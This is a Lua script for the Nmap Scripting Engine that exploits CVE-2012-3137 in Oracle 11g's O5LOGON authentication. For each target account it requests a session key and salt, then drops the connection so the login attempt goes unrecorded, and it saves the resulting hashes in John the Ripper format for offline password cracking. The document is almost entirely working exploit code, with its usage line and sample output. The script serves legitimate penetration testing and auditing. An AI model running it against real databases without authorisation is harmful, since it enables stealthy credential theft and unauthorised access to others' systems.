local brute = require "brute"
local coroutine = require "coroutine"
local creds = require "creds"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local stringaux = require "stringaux"
local tns = require "tns"
local unpwdb = require "unpwdb"

local openssl = stdnse.silent_require "openssl"

description = [[
Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's
O5LOGIN authentication scheme.  The vulnerability exists in Oracle 11g
R1/R2 and allows linking the session key to a password hash.  When
initiating an authentication attempt as a valid user the server will
respond with a session key and salt.  Once received the script will
disconnect the connection thereby not recording the login attempt.
The session key and salt can then be used to brute force the users
password.
]]

---
-- @see oracle-brute.nse
--
-- @usage
-- nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL <host>
--
-- @output
-- PORT     STATE  SERVICE REASON
-- 1521/tcp open  oracle  syn-ack
-- | oracle-brute-stealth:
-- |   Accounts
-- |     dummy:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 - Hashed valid or invalid credentials
-- |     nmap:$o5logon$D1B28967547DBA3917D7B129E339F96156C8E2FE5593D42540992118B3475214CA0F6580FD04C2625022054229CAAA8D*7BCF2ACF08F15F75B579 - Hashed valid or invalid credentials
-- |   Statistics
-- |_    Performed 2 guesses in 1 seconds, average tps: 2
--
-- @args oracle-brute-stealth.sid - the instance against which to perform password guessing
-- @args oracle-brute-stealth.nodefault - do not attempt to guess any Oracle default accounts
-- @args oracle-brute-stealth.accounts - a list of comma separated accounts to test
-- @args oracle-brute-stealth.johnfile - if specified the hashes will be written to this file to be used by JtR

--
-- Version 0.1
-- Created 06/10/2012 - v0.1 - created by Dhiru Kholia
--
-- Summary
-- -------
--   x The Driver class contains the driver implementation used by the brute
--     library

author = "Dhiru Kholia"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "brute"}

portrule = shortport.port_or_service(1521, "oracle-tns", "tcp", "open")

local ConnectionPool = {}
local arg_johnfile = stdnse.get_script_args(SCRIPT_NAME .. '.johnfile')
local johnfile

Driver =
{

  new = function(self, host, port, sid )
    local o = { host = host, port = port, sid = sid }
    setmetatable(o, self)
    self.__index = self
    return o
  end,

  --- Connects performs protocol negotiation
  --
  -- @return true on success, false on failure
  connect = function( self )
    local MAX_RETRIES = 10
    local tries = MAX_RETRIES

    self.helper = ConnectionPool[coroutine.running()]
    if ( self.helper ) then return true end

    self.helper = tns.Helper:new( self.host, self.port, self.sid )

    -- This loop is intended for handling failed connections
    -- A connection may fail for a number of different reasons.
    -- For the moment, we're just handling the error code 12520
    --
    -- Error 12520 has been observed on Oracle XE and seems to
    -- occur when a maximum connection count is reached.
    local status, data
    repeat
      if ( tries < MAX_RETRIES ) then
        stdnse.debug2("Attempting to re-connect (attempt %d of %d)", MAX_RETRIES - tries, MAX_RETRIES)
      end
      status, data = self.helper:Connect()
      if ( not(status) ) then
        stdnse.debug2("ERROR: An Oracle %s error occurred", data)
        self.helper:Close()
      else
        break
      end
      tries = tries - 1
      stdnse.sleep(1)
    until( tries == 0 or data ~= "12520" )

    if ( status ) then
      ConnectionPool[coroutine.running()] = self.helper
    end

    return status, data
  end,

  --- Attempts to login to the Oracle server
  --
  -- @param username string containing the login username
  -- @param password string containing the login password
  -- @return status, true on success, false on failure
  -- @return brute.Error object on failure
  --         creds.Account object on success
  login = function( self, username, password )
    local status, data = self.helper:StealthLogin( username, password )

    if ( data["AUTH_VFR_DATA"] ) then
      local hash = string.format("$o5logon$%s*%s", data["AUTH_SESSKEY"], data["AUTH_VFR_DATA"])
      if ( johnfile ) then
        johnfile:write(("%s:%s\n"):format(username,hash))
      end
      return true, creds.Account:new(username, hash, creds.State.HASHED)
    else
      return false, brute.Error:new( data )
    end


  end,

  --- Disconnects and terminates the Oracle TNS communication
  disconnect = function( self )
    return true
  end,

}

local function fail (err) return stdnse.format_output(false, err) end

action = function(host, port)
  local DEFAULT_ACCOUNTS = "nselib/data/oracle-default-accounts.lst"
  local sid = stdnse.get_script_args(SCRIPT_NAME .. '.sid') or stdnse.get_script_args('tns.sid')
  local engine = brute.Engine:new(Driver, host, port, sid)
  local arg_accounts = stdnse.get_script_args(SCRIPT_NAME .. '.accounts')
  local mode = arg_accounts and "accounts" or "default"

  if ( not(sid) ) then
    return fail("Oracle instance not set (see oracle-brute-stealth.sid or tns.sid)")
  end

  if ( arg_johnfile ) then
    johnfile = io.open(arg_johnfile, "w")
    if ( not(johnfile) ) then
      return fail(("Failed to open %s for writing"):format(johnfile))
    end
  end

  local helper = tns.Helper:new( host, port, sid )
  local status, result = helper:Connect()
  if ( not(status) ) then
    return fail("Failed to connect to oracle server")
  end
  helper:Close()

  if ( stdnse.get_script_args('userdb') or
    stdnse.get_script_args('passdb') or
    stdnse.get_script_args('oracle-brute-stealth.nodefault') or
    stdnse.get_script_args('brute.credfile') ) then
    mode = nil
  end

  if ( mode == "default" ) then
    local f = nmap.fetchfile(DEFAULT_ACCOUNTS)
    if ( not(f) ) then
      return fail(("Failed to find %s"):format(DEFAULT_ACCOUNTS))
    end

    f = io.open(f)
    if ( not(f) ) then
      return fail(("Failed to open %s"):format(DEFAULT_ACCOUNTS))
    end

    engine.iterator = brute.Iterators.credential_iterator(f)
  elseif( "accounts" == mode ) then
    engine.iterator = unpwdb.table_iterator(stringaux.strsplit(",%s*", arg_accounts))
  end

  engine.options.useraspass = false
  engine.options.mode = "user"
  engine.options.script_name = SCRIPT_NAME
  status, result = engine:start()

  if ( johnfile ) then
    johnfile:close()
  end

  return result
end
